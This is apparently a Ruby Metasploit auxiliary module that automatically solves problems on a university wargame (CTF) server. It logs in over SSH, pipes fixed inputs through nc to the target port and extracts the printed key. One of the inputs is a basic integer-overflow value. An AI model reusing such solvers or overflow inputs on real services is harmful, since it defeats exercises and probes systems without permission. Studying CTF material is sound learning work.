require 'io/console'
require 'msf/core'

class Metasploit3 < Msf::Auxiliary
	def initialize
		super(
			'Name' => 'CS Wargame Solver: attack',
			'Version' => '$Revision:$',
			'Description' => 'Get the key immediately by this module.',
			'Author' => ['Femi'],
			'Liciense' => MSF_LICENSE,
			'Reference' => []
		)

		register_options([
			OptAddress.new('WHOST', [
				true,
				'the workstation host',
				'wargame2.cs.nctu.edu.tw'
			]),
			OptInt.new('PROBLEM', [
				true,
				'the problem id',
				''
			]),
			OptAddress.new('THOST', [
				true,
				'the target host',
				''
			]),
			OptPort.new('TPORT', [
				true,
				'the target port',
				''
			]),
			OptString.new('ACCOUNT', [
				false,
				'the website account',
				''
			]),
			OptString.new('PASSWORD', [
				false,
				'the website password',
				''
			])
		], self.class)
	end

	def run
		whost = datastore['WHOST']
		thost = datastore['THOST']
		tport = datastore['TPORT']
		pid = datastore['PROBLEM']

		account = datastore['ACCOUNT']
		password = datastore['PASSWORD']
		if account.empty?
			print "Please enter your account: "
			account = gets.chomp!
		end
		if password.empty?
			print "Please enter your password: "
			password = STDIN.noecho(&:gets).chomp!
			puts ""
		end

		problems = {
			1 => [
				'Connect to server! easy start',
				"echo '#{account}'"
			],
			2 => [
				'[Basic] Integer Over Flow',
				"echo 2147478598; echo 2147478598"
			]
		}

		if !problems.has_key? pid
			puts "\e[1;31mInvalid problem id '#{pid}'."
			puts "Maybe this problem hasn't been implemented yet.\e[m"
			return
		end

		cmd = problems[pid][1]
		puts "Trying to solve the problem '#{problems[pid][0]}'"
		puts "Please wait for the result..."

		begin
			Net::SSH.start(whost, account, :password => password) do |ssh|
				ssh.exec!("{ #{cmd} ; } | nc -v #{thost} #{tport} | grep 'key: ' | cut -d ' ' -f 2") do |ch2, stream, data|
					if stream == :stdout
						puts "Your key is: \e[1;33m#{data}\e[m"
					end
					if stream == :stderr && data =~ /Connection refused/
						puts "\e[1;31mThe target port #{thost}:#{tport} is not opened."
						puts "Try click the \e[43mstart\e[m\e[1;31m or \e[43mrestart\e[m\e[1;31m button on the website.\e[m"
					end
				end
			end

		rescue Net::SSH::AuthenticationFailed
			puts "\e[1;31mFail to login #{whost}"
			puts "Your account or password may be wrong.\e[m"
		end
	end
end

